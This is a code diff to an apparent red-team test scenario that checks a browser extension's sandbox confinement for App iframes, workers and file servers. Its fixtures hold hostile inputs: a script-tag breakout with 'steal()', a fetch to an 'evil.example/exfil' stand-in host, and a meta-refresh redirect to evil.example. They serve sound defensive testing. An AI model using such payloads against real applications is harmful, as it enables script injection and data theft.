@@ -24,7 +24,7 @@ import {
 import { applyNotebookRealmSeal } from '../../../extension/engine-tabs/notebook-tab/notebook-neutralizers.js';
 import { resolveRelativePath } from '../../../extension/peerd-engine/module-resolver.js';
 import { opfsHelpers } from '../../../extension/peerd-engine/opfs.js';
-import { APP_FILES_HANDOFF, composeApp, stripMetaRefresh } from '../../../extension/peerd-engine/app-compose.js';
+import { APP_FILE_MISSING_EVENT, APP_FILES_HANDOFF, composeApp, stripMetaRefresh } from '../../../extension/peerd-engine/app-compose.js';
 import { normalizeRequest, needsWebWriteConfirm } from '../../../extension/peerd-engine/vm-net/http-bridge.js';
 import {
   buildAppEgressBlockRule,
@@ -80,7 +80,7 @@ export const scenario: Scenario = {
   title: 'Sandbox escape (Notebook/Pod workers, App iframe, WebVM)',
   adversary: 'malicious sandboxed code',
   asset: 'the host origin, the network, and other sandbox instances',
-  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe, read packaged extension files through its file server, or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
+  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe, read or run packaged extension files through its file server, or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
   threatModelRef: 'INV-6',
   tier: 'unit',
   async run() {
@@ -221,16 +221,16 @@ export const scenario: Scenario = {
         : leaked('break the model trust fence through remote return, console, or error text', 'remote-controlled output escaped the fence'));
     }
 
-    // 7) App iframe: hostile bundle code cannot break out of the worker shim
-    //    or drive a meta-refresh navigation out of the opaque frame.
+    // 7) App iframe: hostile bundle code cannot break out through a worker
+    //    source or drive a meta-refresh navigation out of the opaque frame.
     {
       const html = '<html><head></head><body><script>new Worker("w.js")</script></body></html>';
       const workerBreakout = '"</script><script>steal()</script>';
       const composed = composeApp({ 'index.html': html, 'w.js': workerBreakout }, 'index.html');
-      const noRawBreakout = !composed.includes('</script><script>steal()</script>') && composed.includes('\\u003c/script>');
+      const noRawBreakout = !composed.includes('steal()');
       probes.push(noRawBreakout
-        ? blocked('embed </script> in an inlined App worker to break out of the shim', 'worker source `<` escaped to \\u003c, no executable breakout tag')
-        : leaked('embed </script> in an inlined App worker to break out of the shim', 'raw </script><script> survived into the document'));
+        ? blocked('embed </script> in an App worker source to break out of the document', 'worker sources never enter the document; the file server starts them from blob: URLs')
+        : leaked('embed </script> in an App worker source to break out of the document', 'the worker source was written into the document'));
 
       // The App's in-realm file server answers its loader's fetch/XHR reads.
       // It must answer extension-origin paths itself, and pass every other
@@ -239,6 +239,17 @@ export const scenario: Scenario = {
       const serverScript = /<script data-peerd-file-server>([\s\S]*?)<\/script>/.exec(composedGame)?.[1] ?? '';
       const nativeCalls: string[] = [];
       const parentPosts: unknown[] = [];
+      const realmEvents: string[] = [];
+      const nativeLoads: unknown[] = [];
+      const revokedUrls = new Set<string>();
+      class AppURL extends URL {
+        static override createObjectURL() { return `blob:chrome-extension://red-team/${revokedUrls.size}`; }
+        static override revokeObjectURL(url: string) { revokedUrls.add(url); }
+      }
+      class AppElement { setAttribute(_name: string, value: unknown) { nativeLoads.push(value); } }
+      class AppScript extends AppElement { set src(value: unknown) { nativeLoads.push(value); } }
+      class AppWorker { constructor(url: unknown) { nativeLoads.push(url); } }
+      class AppAudioWorklet { addModule(url: unknown) { nativeLoads.push(url); } }
       const appWindow: Record<string, unknown> = {
         location: { href: 'chrome-extension://red-team/engine-tabs/app-tab/runner.html#1' },
         fetch: (input: unknown) => {
@@ -249,7 +260,9 @@ export const scenario: Scenario = {
         ProgressEvent: Event,
         parent: { postMessage: (message: unknown) => parentPosts.push(message) },
         postMessage: (message: unknown) => parentPosts.push(message),
-        Blob, DOMException, Event, Request, Response, TextDecoder, URL,
+        Blob, DOMException, Event, Request, Response, TextDecoder, URL: AppURL,
+        dispatchEvent: (event: Event) => realmEvents.push(event.type) > 0,
+        Element: AppElement, HTMLScriptElement: AppScript, Worker: AppWorker, AudioWorklet: AppAudioWorklet,
         [APP_FILES_HANDOFF]: { 'game.wasm': new Uint8Array([0, 97, 115, 109]).buffer },
       };
       // eslint-disable-next-line no-new-func
@@ -266,12 +279,29 @@ export const scenario: Scenario = {
       await appFetch('https://evil.example/exfil').catch(() => {});
       const missingStatus = (await appFetch('missing.data')).status;
       const noNewChannel = JSON.stringify(nativeCalls) === '["https://evil.example/exfil"]'
-        && missingStatus === 404 && parentPosts.length === 0 && !serverScript.includes('postMessage');
+        && missingStatus === 404 && realmEvents.at(-1) === APP_FILE_MISSING_EVENT
+        && parentPosts.length === 0 && !serverScript.includes('postMessage');
       probes.push(noNewChannel
         ? blocked('turn the App file server into a network or parent-file channel',
-          'a remote URL reaches only the native fetch the CSP refuses; a missing file is a local 404 with no parent request')
+          'a remote URL reaches only the native fetch the CSP refuses; a missing file is a local 404 and an in-realm event, with no parent request')
         : leaked('turn the App file server into a network or parent-file channel',
           `native=${JSON.stringify(nativeCalls)} missing=${missingStatus} parentPosts=${parentPosts.length}`));
+
+      // A script src, Worker, or audio worklet URL for a packaged extension
+      // file must reach the browser only as a revoked blob: URL.
+      const script = new (appWindow.HTMLScriptElement as typeof AppScript)();
+      script.src = '/background/vault-kernel.js';
+      script.setAttribute('src', '../../manifest.json');
+      new (appWindow.Worker as typeof AppWorker)('/offscreen/actor-worker.js');
+      new (appWindow.AudioWorklet as typeof AppAudioWorklet)().addModule('../../shared/util.js');
+      const onlyRevoked = nativeLoads.length === 4
+        && nativeLoads.every((url) => typeof url === 'string' && revokedUrls.has(url))
+        && parentPosts.length === 0;
+      probes.push(onlyRevoked
+        ? blocked('run a packaged extension script through a dynamic script, Worker, or worklet URL',
+          'every packaged path becomes a revoked blob: URL that fails to load; the parent gets no request')
+        : leaked('run a packaged extension script through a dynamic script, Worker, or worklet URL',
+          `loads=${JSON.stringify(nativeLoads)} parentPosts=${parentPosts.length}`));
 
       const refreshed = stripMetaRefresh('<head><meta content="0;url=//evil.example" http-equiv=refresh></head>');
       const noRefresh = !/http-equiv\s*=\s*["']?refresh/i.test(refreshed);
@@ -371,7 +401,7 @@ export const scenario: Scenario = {
       'opfsHelpers (host-side mutation posture before root access)',
       'buildWorkerSource + formatEvalResult (remote graph capability collapse + output fence)',
       'composeApp + stripMetaRefresh (App iframe breakout/navigation defense)',
-      'serveAppFiles (App file server: extension-origin 404s, no new network or parent channel)',
+      'serveAppFiles (App file server: extension-origin 404s and revoked script/Worker/worklet URLs, no new network or parent channel)',
       'buildAppEgressBlockRule (tab-scoped HTTP(S)/WebSocket network floor)',
       'makeOffscreenActorChannelClient (exact-client channel transfer)',
       'normalizeRequest + needsWebWriteConfirm (WebVM bridge scheme/CRLF/auth/confirm)',
